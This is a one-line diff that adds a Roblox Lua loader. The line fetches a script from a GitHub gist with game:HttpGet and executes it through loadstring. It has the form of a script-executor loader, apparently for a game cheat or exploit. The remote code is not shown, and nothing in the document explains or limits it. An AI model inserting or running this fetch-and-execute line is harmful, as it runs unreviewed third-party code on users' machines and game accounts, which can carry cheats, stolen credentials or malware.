@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/teteusousa560-cloud/2014d18f0c2af10ecca46fac9703050b/raw"))()
